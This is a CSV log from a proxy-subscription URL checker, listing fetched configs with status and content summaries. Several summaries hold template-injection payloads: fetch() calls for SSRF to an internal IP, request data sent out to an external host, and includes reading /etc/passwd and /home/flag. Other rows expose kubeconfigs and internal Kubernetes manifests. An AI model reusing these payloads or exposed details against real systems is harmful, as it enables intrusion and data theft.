原始URL,最终URL,状态,节点数,HTTP码,响应秒数,是否有更新,历史检查,历史更新,更新频率,上次更新时间,摘要
http://164.92.65.169:8888/test_myurls_nocache.yaml,http://164.92.65.169:8888/test_myurls_nocache.yaml,无有效节点,0,200,0.18,否,3,1,1/3,2026-09-02 22:04:30,"port: 7890 external-controller: ""MYURLS:{{ fetch(""http://172.24.0.4:8080/?nocache=1786968077&unique=10076"") }}"" proxies: [] rules:   - MATCH,DIRECT "
http://164.92.65.169:8888/test_pref_again.yaml,http://164.92.65.169:8888/test_pref_again.yaml,无有效节点,0,200,0.68,否,3,1,1/3,2026-09-02 22:04:30,"port: 7890 custom_pref: |   {% include ""pref.yml"" %} proxies: [] rules:   - MATCH,DIRECT "
http://164.92.65.169:8888/test_request_params.yaml,http://164.92.65.169:8888/test_request_params.yaml,无有效节点,0,200,0.67,否,3,1,1/3,2026-09-02 22:04:30,"port: 7890 {% set _ = fetch(""http://164.92.65.169:8888/reqtest?args="" + UrlEncode(request._args)) %} proxies: [] rules:   - MATCH,DIRECT "
http://164.92.65.169:8888/test_set_fetch.yaml,http://164.92.65.169:8888/test_set_fetch.yaml,无有效节点,0,200,0.19,否,3,1,1/3,2026-09-02 22:04:30,"port: 7890 {% set my_val = ""HELLO_FROM_SET"" %} {% set _ = fetch(""http://164.92.65.169:8888/set_test?v="" + my_val) %} proxies: [] rules:   - MATCH,DIRECT "
http://164.92.65.169:8888/traversal_test.yaml,http://164.92.65.169:8888/traversal_test.yaml,无有效节点,0,200,0.67,否,3,1,1/3,2026-09-02 22:04:30,"port: 7890 external-controller: ""TPL:{% include ""../../etc/passwd"" %}"" proxies: [] rules:   - MATCH,DIRECT "
http://164.92.65.169:8888/try_include.yaml,http://164.92.65.169:8888/try_include.yaml,无有效节点,0,200,0.19,否,3,1,1/3,2026-09-02 22:04:30,"port: 7890 external-controller: |   FILE:/home/flag   {% include ""/home/flag"" %}   FILEEND proxies: [] rules:   - MATCH,DIRECT "
http://164.92.65.169:8888/vps_closed_test.yaml,http://164.92.65.169:8888/vps_closed_test.yaml,无有效节点,0,200,0.19,否,3,1,1/3,2026-09-02 22:04:30,"port: 7890 external-controller: ""test_{{ fetch(""http://164.92.65.169:9999/test?t=1786968254"") }}_end"" proxies: [] rules:   - MATCH,DIRECT "
http://165.154.193.165/ai-6dc76f922c8c1fe1b3b2173d6b3ad4d5.yaml,http://165.154.193.165/ai-6dc76f922c8c1fe1b3b2173d6b3ad4d5.yaml,提取成功,2,200,0.38,否,3,1,1/3,2026-09-02 22:04:30,
http://165.254.188.228/0f62424ae036410bbfc6805279c922bd7a9e3b46.yaml,http://165.254.188.228/0f62424ae036410bbfc6805279c922bd7a9e3b46.yaml,提取成功,1,200,0.18,否,3,1,1/3,2026-09-02 22:04:30,
http://165.99.43.145/sub-all.yaml,http://165.99.43.145/sub-all.yaml,请求失败,0,0,0.0,否,3,1,1/3,2026-09-02 22:04:30,
http://165.99.43.145/sub.yaml,http://165.99.43.145/sub.yaml,请求失败,0,0,0.0,否,3,1,1/3,2026-09-02 22:04:30,
http://165.99.43.145/sub154.yaml,http://165.99.43.145/sub154.yaml,请求失败,0,0,0.0,否,3,1,1/3,2026-09-02 22:04:30,
http://165.99.43.145/sub45.yaml,http://165.99.43.145/sub45.yaml,请求失败,0,0,0.0,否,3,1,1/3,2026-09-02 22:04:30,
http://165.99.43.145:8001/sub-all.yaml,http://165.99.43.145:8001/sub-all.yaml,请求失败,0,0,0.0,否,3,1,1/3,2026-09-02 22:04:30,
http://165.99.43.145:8001/sub.yaml,http://165.99.43.145:8001/sub.yaml,请求失败,0,0,0.0,否,3,1,1/3,2026-09-02 22:23:42,
http://165.99.43.145:8001/sub45.yaml,http://165.99.43.145:8001/sub45.yaml,请求失败,0,0,0.0,否,3,1,1/3,2026-09-02 22:04:30,
http://167.17.68.242:9999/aiwo-acq-rls-read.txt,http://167.17.68.242:9999/aiwo-acq-rls-read.txt,无有效节点,0,200,0.12,否,3,1,1/3,2026-09-02 22:04:30,           relname           | relrowsecurity | relforcerowsecurity  -----------------------------+----------------+---------------------  acquisition_batches         | t              | t  acquisition_campaigns       | t              | t  acquisition_events          | t              | t  acquisition_lead_candidates | t              | t (4 rows)            tablename          | cmd |     roles      |                 qual                  |              with_check                -------------------
http://167.17.68.242:9999/aiwo-acq-rls-write.txt,http://167.17.68.242:9999/aiwo-acq-rls-write.txt,无有效节点,0,200,0.16,否,3,1,1/3,2026-09-02 22:04:30,"BEGIN SET               set_config               --------------------------------------  018f0f00-0000-7000-8000-ffffffffffff (1 row)  ERROR:  new row violates row-level security policy for table ""acquisition_campaigns"" command terminated with exit code 3 "
http://167.17.68.242:9999/baas-control-plane-dryrun.txt,http://167.17.68.242:9999/baas-control-plane-dryrun.txt,无有效节点,0,200,0.19,否,3,1,1/3,2026-09-02 22:04:30,deployment.apps/baas-admin created (dry run) service/baas-admin created (dry run) deployment.apps/baas-frontend created (dry run) service/baas-frontend created (dry run) ingress.networking.k8s.io/baas-control-plane created (dry run) 
http://167.17.68.242:9999/baas-database-audit-job-20260713.yaml,http://167.17.68.242:9999/baas-database-audit-job-20260713.yaml,无有效节点,0,200,0.15,否,3,1,1/3,2026-09-02 22:04:30,apiVersion: batch/v1 kind: Job metadata:   name: database-audit-reaccept-20260713   namespace: baas-dev   labels:     app.kubernetes.io/name: database-audit-reaccept spec:   backoffLimit: 0   activeDeadlineSeconds: 300   ttlSecondsAfterFinished: 3600   template:     metadata:       labels:         app.kubernetes.io/name: database-audit-reaccept     spec:       restartPolicy: Never       containers:         - name: audit           image: postgres:16-alpine           imagePullPolicy: IfNotPresent 
http://167.17.68.242:9999/baas-dedicated-acceptance-k3s.yaml,http://167.17.68.242:9999/baas-dedicated-acceptance-k3s.yaml,无有效节点,0,200,0.17,否,3,1,1/3,2026-09-02 22:04:30,apiVersion: v1 clusters: - cluster:     certificate-authority-data: LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUJkekNDQVIyZ0F3SUJBZ0lCQURBS0JnZ3Foa2pPUFFRREFqQWpNU0V3SHdZRFZRUUREQmhyTTNNdGMyVnkKZG1WeUxXTmhRREUzT0RNNU16YzVNVFF3SGhjTk1qWXdOekV6TVRBeE9ETTBXaGNOTXpZd056RXdNVEF4T0RNMApXakFqTVNFd0h3WURWUVFEREJock0zTXRjMlZ5ZG1WeUxXTmhRREUzT0RNNU16YzVNVFF3V1RBVEJnY3Foa2pPClBRSUJCZ2dxaGtqT1BRTUJCd05DQUFTQUJMY1BWRCtWMDM5L0hqSFdzYWhBYmdHSGJTOVBoUmhvRGlMYnlkVk4KMTBmS2hzNUpwOWlraEVhOUNRajczbjBZYW56eUVRa3hBaGNn
http://167.17.68.242:9999/baas-dedicated-acceptance-kubeconfig.yaml,http://167.17.68.242:9999/baas-dedicated-acceptance-kubeconfig.yaml,无有效节点,0,200,0.17,否,3,1,1/3,2026-09-02 22:04:30,apiVersion: v1 clusters: - cluster:     certificate-authority-data: LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUJkekNDQVIyZ0F3SUJBZ0lCQURBS0JnZ3Foa2pPUFFRREFqQWpNU0V3SHdZRFZRUUREQmhyTTNNdGMyVnkKZG1WeUxXTmhRREUzT0RNNU1EVXdPRFF3SGhjTk1qWXdOekV6TURFeE1USTBXaGNOTXpZd056RXdNREV4TVRJMApXakFqTVNFd0h3WURWUVFEREJock0zTXRjMlZ5ZG1WeUxXTmhRREUzT0RNNU1EVXdPRFF3V1RBVEJnY3Foa2pPClBRSUJCZ2dxaGtqT1BRTUJCd05DQUFUUG1YaHN4VzZycWpBL0NaRTFJTmxxd0ZqeERBVURGN3AwSGhvaGs1RnMKZHplc0UrRGhreTBMdkNKa1BWT1lGSjNXWk1Pellma0NnYVpS
http://167.17.68.242:9999/baas-postgres-dryrun.txt,http://167.17.68.242:9999/baas-postgres-dryrun.txt,无有效节点,0,200,0.19,否,3,1,1/3,2026-09-02 22:04:30,namespace/baas-data created (dry run) service/baas-postgres created (dry run) service/baas-postgres-runtime created (dry run) statefulset.apps/baas-postgres created (dry run) networkpolicy.networking.k8s.io/baas-postgres-ingress created (dry run) 
http://167.17.68.242:9999/block-row-key-precommit.yaml,http://167.17.68.242:9999/block-row-key-precommit.yaml,无有效节点,0,200,0.19,否,3,1,1/3,2026-09-02 22:04:30,apiVersion: v1 kind: Pod metadata:   name: block-row-key-precommit   namespace: baas-dev   labels:     app.kubernetes.io/name: block-row-key-test spec:   activeDeadlineSeconds: 1800   restartPolicy: Never   containers:     - name: test       image: node:20.13.1-bookworm       imagePullPolicy: IfNotPresent       command:         - /bin/bash         - -c       args:         - |-           cp -a /src/frontend/. /work/ &&           corepack enable &&           corepack prepare pnpm@9.15.4 --activate
http://167.17.68.242:9999/chaincode-publication-unit-precommit-r7.yaml,http://167.17.68.242:9999/chaincode-publication-unit-precommit-r7.yaml,无有效节点,0,200,0.16,否,3,1,1/3,2026-09-02 22:04:30,apiVersion: v1 kind: Pod metadata:   name: chaincode-publication-unit-precommit-r7   namespace: baas-dev   labels:     app.kubernetes.io/name: chaincode-publication-unit spec:   activeDeadlineSeconds: 1200   restartPolicy: Never   containers:     - name: test       image: golang:1.26-bookworm       imagePullPolicy: IfNotPresent       command:         - /bin/bash         - -c       args:         - >-           /usr/local/go/bin/go test ./apis ./service ./cmd/server -run           'TestChaincodeAP
http://167.17.68.242:9999/checklist-recheck-dev-12c0feb6.yaml,http://167.17.68.242:9999/checklist-recheck-dev-12c0feb6.yaml,无有效节点,0,200,0.18,否,3,1,1/3,2026-09-02 22:04:30,apiVersion: v1 kind: Pod metadata:   name: checklist-recheck-dev-12c0feb6   namespace: baas-dev   labels:     app.kubernetes.io/name: acceptance     baas.acceptance/suite: checklist-recheck     baas.acceptance/commit: 12c0feb6 spec:   restartPolicy: Never   hostAliases:     - ip: 167.17.68.242       hostnames:         - dev-platform-baas.mss-boot-io.top   containers:     - name: browser       image: mcr.microsoft.com/playwright:v1.59.1-noble       imagePullPolicy: IfNotPresent       env:        
http://167.17.68.242:9999/checklist-recheck-uat-12c0feb6.yaml,http://167.17.68.242:9999/checklist-recheck-uat-12c0feb6.yaml,无有效节点,0,200,0.16,否,3,1,1/3,2026-09-02 22:04:30,apiVersion: v1 kind: Pod metadata:   name: checklist-recheck-uat-12c0feb6   namespace: baas-platform   labels:     app.kubernetes.io/name: acceptance     baas.acceptance/suite: checklist-recheck     baas.acceptance/commit: 12c0feb6 spec:   restartPolicy: Never   hostAliases:     - ip: 167.17.68.242       hostnames:         - platform-baas.mss-boot-io.top   containers:     - name: browser       image: mcr.microsoft.com/playwright:v1.59.1-noble       imagePullPolicy: IfNotPresent       env:       
http://167.17.68.242:9999/dev-admin-stability-12c0feb6.yaml,http://167.17.68.242:9999/dev-admin-stability-12c0feb6.yaml,无有效节点,0,200,0.16,否,3,1,1/3,2026-09-02 22:04:30,"apiVersion: v1 kind: ServiceAccount metadata:   name: dev-admin-stability-12c0feb6   namespace: baas-dev --- apiVersion: rbac.authorization.k8s.io/v1 kind: Role metadata:   name: dev-admin-stability-12c0feb6   namespace: baas-dev rules:   - apiGroups: [""""]     resources: [""pods""]     verbs: [""get"", ""list""]   - apiGroups: [""apps""]     resources: [""deployments""]     verbs: [""get""] --- apiVersion: rbac.authorization.k8s.io/v1 kind: RoleBinding metadata:   name: dev-admin-stability-12c0feb6   namesp"
http://167.17.68.242:9999/dev-chaincode-282e6720-resources.yaml,http://167.17.68.242:9999/dev-chaincode-282e6720-resources.yaml,无有效节点,0,200,0.15,否,3,1,1/3,2026-09-02 22:04:30,"apiVersion: v1 kind: ConfigMap metadata:   name: chaincode-dev-282e6720-env   namespace: baas-dev   labels:     baas.acceptance/run: ui-dev-chaincode-282e6720 data:   PREFERRED_NETWORK_ID: 33fc137673dd42c7a0aa46fb870a88ce   PREFERRED_NETWORK_NAME: uinetwork-0703094406   RUNTIME_NAMESPACE: uinetwork-0703094406   EVIDENCE_IMAGE: gitea-baas.mss-boot-io.top/baas-chaincodes/baas-chaincode-evidence:uat-20260628-9ffefdc   PUBLICATION_WAIT_TIMEOUT_MS: ""900000""   RUNTIME_WAIT_TIMEOUT_MS: ""600000"" --- api"
http://167.17.68.242:9999/dev-chaincode-cf987358-resources.yaml,http://167.17.68.242:9999/dev-chaincode-cf987358-resources.yaml,无有效节点,0,200,0.17,否,3,1,1/3,2026-09-02 22:04:30,"apiVersion: v1 kind: ConfigMap metadata:   name: chaincode-dev-cf987358-env   namespace: baas-dev   labels:     baas.acceptance/run: ui-dev-chaincode-cf987358 data:   PREFERRED_NETWORK_ID: 33fc137673dd42c7a0aa46fb870a88ce   PREFERRED_NETWORK_NAME: uinetwork-0703094406   RUNTIME_NAMESPACE: uinetwork-0703094406   EVIDENCE_IMAGE: gitea-baas.mss-boot-io.top/baas-chaincodes/baas-chaincode-evidence:uat-20260628-9ffefdc   PUBLICATION_WAIT_TIMEOUT_MS: ""900000""   RUNTIME_WAIT_TIMEOUT_MS: ""600000"" --- api"
http://167.17.68.242:9999/dns-cutover-final-20260712.yaml,http://167.17.68.242:9999/dns-cutover-final-20260712.yaml,无有效节点,0,200,0.19,否,3,1,1/3,2026-09-02 22:04:30,apiVersion: batch/v1 kind: Job metadata:   name: dns-cutover-final-20260712   namespace: baas-dev   labels:     app.kubernetes.io/name: dns-cutover-final     app.kubernetes.io/part-of: baas-acceptance spec:   backoffLimit: 0   ttlSecondsAfterFinished: 3600   template:     metadata:       labels:         app.kubernetes.io/name: dns-cutover-final     spec:       restartPolicy: Never       activeDeadlineSeconds: 300       containers:         - name: verify           image: alpine:3.20           ima
http://167.17.68.242:9999/final-db-audit-dev-12c0feb6.yaml,http://167.17.68.242:9999/final-db-audit-dev-12c0feb6.yaml,无有效节点,0,200,0.18,否,3,1,1/3,2026-09-02 22:04:30,apiVersion: v1 kind: Pod metadata:   name: final-db-audit-dev-12c0feb6   namespace: baas-dev   labels:     app.kubernetes.io/name: acceptance     baas.acceptance/suite: database-audit     baas.acceptance/commit: 12c0feb6 spec:   activeDeadlineSeconds: 300   restartPolicy: Never   containers:     - name: audit       image: postgres:16-alpine       imagePullPolicy: IfNotPresent       env:         - name: DB_DSN           valueFrom:             secretKeyRef:               name: baas-admin-runtime  
http://167.17.68.242:9999/final-db-audit-uat-12c0feb6.yaml,http://167.17.68.242:9999/final-db-audit-uat-12c0feb6.yaml,无有效节点,0,200,0.18,否,3,1,1/3,2026-09-02 22:04:30,apiVersion: v1 kind: Pod metadata:   name: final-db-audit-uat-12c0feb6   namespace: baas-platform   labels:     app.kubernetes.io/name: acceptance     baas.acceptance/suite: database-audit     baas.acceptance/commit: 12c0feb6 spec:   activeDeadlineSeconds: 300   restartPolicy: Never   containers:     - name: audit       image: postgres:16-alpine       imagePullPolicy: IfNotPresent       env:         - name: DB_DSN           valueFrom:             secretKeyRef:               name: baas-admin-runt
http://167.17.68.242:9999/frontend-error-ui-check-pod.yaml,http://167.17.68.242:9999/frontend-error-ui-check-pod.yaml,无有效节点,0,200,0.19,否,3,1,1/3,2026-09-02 22:04:30,"apiVersion: v1 kind: Pod metadata:   name: organization-error-ui-check-r2-b3d3e8a7   namespace: baas-dev   labels:     acceptance.baas/run: organization-error-ui-check-r2-b3d3e8a7 spec:   restartPolicy: Never   activeDeadlineSeconds: 1200   containers:     - name: frontend-check       image: node:22-bookworm       resources: {}       env:         - name: TMPDIR           value: /tmp/work       command: [""/bin/bash"", ""-ec""]       args:         - >-           cd /source/frontend;           ./node_"
http://167.17.68.242:9999/kubeconfig-baas-runtime-69.yaml,http://167.17.68.242:9999/kubeconfig-baas-runtime-69.yaml,无有效节点,0,200,0.2,否,3,1,1/3,2026-09-02 22:04:30,apiVersion: v1 clusters: - cluster:     certificate-authority-data: LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSURCVENDQWUyZ0F3SUJBZ0lJUmk1Y29HdnpwRmt3RFFZSktvWklodmNOQVFFTEJRQXdGVEVUTUJFR0ExVUUKQXhNS2EzVmlaWEp1WlhSbGN6QWVGdzB5TmpBM01ETXdNekV5TkRsYUZ3MHpOakEyTXpBd016RTNORGxhTUJVeApFekFSQmdOVkJBTVRDbXQxWW1WeWJtVjBaWE13Z2dFaU1BMEdDU3FHU0liM0RRRUJBUVVBQTRJQkR3QXdnZ0VLCkFvSUJBUURWV1ZPSVg4SU9UQy9hWE9iaGZGZXFQZFlXUGZxam1rZ2ZYaHJROElwOGZqbmNCdFdydmJvam40MFUKYk5NNmIvOE1kK1NTV2dJVkJpODlPSU1ZbTFqQXRweldKN3E3
http://167.17.68.242:9999/public-ingress-reaccept-20260713.yaml,http://167.17.68.242:9999/public-ingress-reaccept-20260713.yaml,无有效节点,0,200,0.18,否,3,1,1/3,2026-09-02 22:04:30,apiVersion: batch/v1 kind: Job metadata:   name: public-ingress-reaccept-20260713   namespace: baas-dev   labels:     app.kubernetes.io/name: public-ingress-reaccept spec:   backoffLimit: 0   activeDeadlineSeconds: 300   ttlSecondsAfterFinished: 3600   template:     metadata:       labels:         app.kubernetes.io/name: public-ingress-reaccept     spec:       restartPolicy: Never       containers:         - name: verify           image: alpine:3.20           imagePullPolicy: IfNotPresent       
http://167.17.68.242:9999/reaccept-24bb-resources.yaml,http://167.17.68.242:9999/reaccept-24bb-resources.yaml,无有效节点,0,200,0.21,否,3,1,1/3,2026-09-02 22:04:30,"apiVersion: v1 kind: ConfigMap metadata:   name: chaincode-dev-reaccept-20260713   namespace: baas-dev   labels:     baas.acceptance/run: reaccept-24bb52df data:   PREFERRED_NETWORK_ID: 33fc137673dd42c7a0aa46fb870a88ce   PREFERRED_NETWORK_NAME: uinetwork-0703094406   RUNTIME_NAMESPACE: uinetwork-0703094406   EVIDENCE_IMAGE: gitea-baas.mss-boot-io.top/baas-chaincodes/baas-chaincode-evidence:uat-20260628-9ffefdc   PUBLICATION_WAIT_TIMEOUT_MS: ""900000""   RUNTIME_WAIT_TIMEOUT_MS: ""600000"" --- apiVer"
http://167.17.68.242:9999/syncer-browser-configmap.yaml,http://167.17.68.242:9999/syncer-browser-configmap.yaml,无有效节点,0,200,0.33,否,3,1,1/3,2026-09-02 22:04:30,"apiVersion: v1 data:   playwright.config.js: |     module.exports = {       testMatch: /.*\.e2e\.js/,       timeout: 120000,       expect: {         timeout: 15000,       },       workers: 1,       use: {         browserName: 'chromium',         headless: true,         ignoreHTTPSErrors: true,         actionTimeout: 15000,         navigationTimeout: 30000,       },     };   syncer-browser.e2e.js: |     const { test, expect, request } = require('@playwright/test');     const fs = require('fs');  "
http://167.17.68.242:9999/syncer-peer-fallback-precommit-r1.yaml,http://167.17.68.242:9999/syncer-peer-fallback-precommit-r1.yaml,无有效节点,0,200,0.28,否,3,1,1/3,2026-09-02 22:04:30,apiVersion: v1 kind: Pod metadata:   name: syncer-peer-fallback-precommit-r4   namespace: baas-dev   labels:     app.kubernetes.io/name: syncer-peer-fallback-test spec:   activeDeadlineSeconds: 1200   restartPolicy: Never   containers:     - name: test       image: golang:1.26-bookworm       imagePullPolicy: IfNotPresent       command:         - /bin/bash         - -c       args:         - |-           set -e           /usr/local/go/bin/go test ./syncer -run \             'TestLedgerBlockSource_
http://167.17.68.242:9999/syncer-postgres-offset-precommit.yaml,http://167.17.68.242:9999/syncer-postgres-offset-precommit.yaml,无有效节点,0,200,0.27,否,3,1,1/3,2026-09-02 22:04:30,apiVersion: v1 kind: Pod metadata:   name: syncer-postgres-offset-precommit   namespace: baas-dev   labels:     app.kubernetes.io/name: syncer-postgres-offset-test spec:   activeDeadlineSeconds: 300   restartPolicy: Never   containers:     - name: test       image: postgres:17-alpine       imagePullPolicy: IfNotPresent       command:         - /bin/sh         - -ec       args:         - |-           psql -v ON_ERROR_STOP=1 \             -h baas-postgres.baas-data.svc.cluster.local \             
http://167.17.68.242:9999/syncer-scheduler-final-12c0feb6.yaml,http://167.17.68.242:9999/syncer-scheduler-final-12c0feb6.yaml,无有效节点,0,200,0.25,否,3,1,1/3,2026-09-02 22:04:30,apiVersion: v1 kind: Pod metadata:   name: syncer-scheduler-final-12c0feb6   namespace: baas-dev   labels:     app.kubernetes.io/name: acceptance     baas.acceptance/suite: syncer-scheduler     baas.acceptance/commit: 12c0feb6 spec:   restartPolicy: Never   containers:     - name: node       image: node:22-alpine       imagePullPolicy: IfNotPresent       env:         - name: DB_DSN           valueFrom:             secretKeyRef:               name: baas-admin-runtime               key: db-dsn    
http://167.17.68.242:9999/syncer-scheduler-inspect-12c0feb6.yaml,http://167.17.68.242:9999/syncer-scheduler-inspect-12c0feb6.yaml,无有效节点,0,200,0.29,否,3,1,1/3,2026-09-02 22:04:30,apiVersion: v1 kind: Pod metadata:   name: syncer-scheduler-inspect-12c0feb6   namespace: baas-dev   labels:     app.kubernetes.io/name: acceptance-inspect     baas.acceptance/suite: syncer-scheduler spec:   restartPolicy: Never   containers:     - name: psql       image: postgres:17-alpine       imagePullPolicy: IfNotPresent       env:         - name: DB_DSN           valueFrom:             secretKeyRef:               name: baas-admin-runtime               key: db-dsn       command:         - /
